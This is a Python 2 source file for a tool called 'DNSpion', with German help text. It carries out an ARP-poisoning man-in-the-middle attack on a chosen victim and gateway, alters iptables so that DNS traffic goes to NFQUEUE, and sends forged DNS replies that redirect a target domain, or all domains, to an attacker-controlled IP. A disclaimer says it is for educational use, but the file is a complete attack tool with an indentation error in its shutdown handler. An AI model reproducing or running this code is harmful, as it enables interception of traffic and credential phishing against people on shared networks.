from twisted.internet import reactor
from twisted.internet.interfaces import IReadDescriptor
import os
import nfqueue
from scapy.all import *
import argparse
import threading
import signal

debug=False

def arg_parser():
    parser = argparse.ArgumentParser()
    parser.add_argument("-d", "--domain", help="Domain, die gespooft werden soll. Example: -d facebook.com")
    parser.add_argument("-r", "--routerIP", help="Gateway IP. Example: -r 192.168.0.1")
    parser.add_argument("-v", "--victimIP", help="Victim IP. Example: -v 192.168.0.5")
    parser.add_argument("-t", "--redirectto", help="Optional: IP des gefakten DNS Server. \
                                                   Wenn nichts anderes angegeben, wird auf die lokale IP umgeleitet (Apache starten!!). \
                                                   Example: -t 192.168.0.14")
    parser.add_argument("-a", "--spoofall", help="Alle DNS Pakete spoofen \
                                                 oder -r um auf externe IP umzuleiten", \
                                                 action="store_true")
    return parser.parse_args()
    
print "**********************************"
print "*** DNSpion v0.1"    
print "*** Support: dnspion@zarat.ml"    
print "*** powered by Python und Scapy" 
print "*** this software is for educational purposes only."
print "*** just penetrate networks that you own or have permission to."
print "*** i am not responsible for any misuse."    
print "**********************************"

def originalMAC(ip):
    ans,unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=5, retry=3, verbose=debug)
    for s,r in ans:
        return r[Ether].src

def poison(routerIP, victimIP, routerMAC, victimMAC):
    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC), verbose=debug)
    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC), verbose=debug)

def restore(routerIP, victimIP, routerMAC, victimMAC):
    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=3, verbose=debug)
    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC), count=3, verbose=debug)

def cb(payload):
    data = payload.get_data()
    pkt = IP(data)
    localIP = [x[4] for x in scapy.all.conf.route.routes if x[2] != '0.0.0.0'][0]
    if not pkt.haslayer(DNSQR):
        payload.set_verdict(nfqueue.NF_ACCEPT)
    else:
        if arg_parser().spoofall:
            if not arg_parser().redirectto:
                spoofed_pkt(payload, pkt, localIP)
            else:
                spoofed_pkt(payload, pkt, arg_parser().redirectto)
        if arg_parser().domain:
            if arg_parser().domain in pkt[DNS].qd.qname:
                if not arg_parser().redirectto:
                    spoofed_pkt(payload, pkt, localIP)
                else:
                    spoofed_pkt(payload, pkt, arg_parser().redirectto)

def spoofed_pkt(payload, pkt, rIP):
    spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                    UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                    DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
                    an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=rIP))
    payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(spoofed_pkt), len(spoofed_pkt))
    print '[info] sent spoofed dns packet for %s' % pkt[DNSQR].qname[:-1]

class Queued(object):
    def __init__(self):
        self.q = nfqueue.queue()
        self.q.set_callback(cb)
        self.q.fast_open(0, socket.AF_INET)
        self.q.set_queue_maxlen(5000)
        reactor.addReader(self)
        self.q.set_mode(nfqueue.NFQNL_COPY_PACKET)
        print '[info] spoofing dns packets'
    def fileno(self):
        return self.q.get_fd()
    def doRead(self):
        self.q.process_pending(100)
    def connectionLost(self, reason):
        reactor.removeReader(self)
    def logPrefix(self):
        return 'queue'

def main(args):
    global victimMAC, routerMAC

    if os.geteuid() != 0:
        sys.exit("[!] Please run as root")

    print "[info] saving ip tables"
    os.system("iptables-save > dnspion_iptables.backup")
    print "[info] enable ip forwarding"
    os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE')

    ipf = open('/proc/sys/net/ipv4/ip_forward', 'r+')
    ipf_read = ipf.read()
    if ipf_read != '1\n':
        ipf.write('1\n')
    ipf.close()

    routerMAC = originalMAC(args.routerIP)
    victimMAC = originalMAC(args.victimIP)
    if routerMAC == None:
        sys.exit("[!] -r MAC not found")
    if victimMAC == None:
        sys.exit("[!] -v MAC not found")

    Queued()
    rctr = threading.Thread(target=reactor.run, args=(False,))
    rctr.daemon = True
    rctr.start()

    def signal_handler(signal, frame):
 
        print '\n[info] disable ip forwarding'
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as forward:
            forward.write(ipf_read)
        time.sleep(2)    
        print "[info] restoring DNS table"
        restore(args.routerIP, args.victimIP, routerMAC, victimMAC)
        restore(args.routerIP, args.victimIP, routerMAC, victimMAC)
        time.sleep(2)   
        print '[info] restoring iptables'
        os.system("iptables-restore < dnspion_iptables.backup")
        os.system("rm dnspion_iptables.backup")
    time.sleep(2)  
        sys.exit("[info] shutting down now")
        
    signal.signal(signal.SIGINT, signal_handler)

    while 1:
        poison(args.routerIP, args.victimIP, routerMAC, victimMAC)
        time.sleep(1.5)

main(arg_parser())
